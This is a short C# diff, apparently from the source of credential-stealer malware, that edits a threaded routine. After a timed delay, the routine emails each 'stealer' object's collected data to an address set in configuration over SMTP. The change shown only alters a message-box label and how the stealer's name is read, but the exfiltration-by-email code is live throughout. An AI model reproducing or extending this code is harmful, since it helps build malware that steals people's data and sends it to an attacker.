@@ -24,8 +24,8 @@ namespace sub.Util.Threading
                                                {
                                                    Thread.Sleep(_delay*60000);
                                                }
-                                               MessageBox.Show(stealer.Data);
-                                               new ReportEmail(stealer.GetType().Name, Settings.EmailAddress,
+                                               MessageBox.Show("Sending Report: " + stealer.Data);
+                                               new ReportEmail(stealer.Name, Settings.EmailAddress,
                                                                Settings.EmailPassword,
                                                                Settings.SmtpAddress, Settings.SmtpPort).Send(
                                                                    stealer.Data);
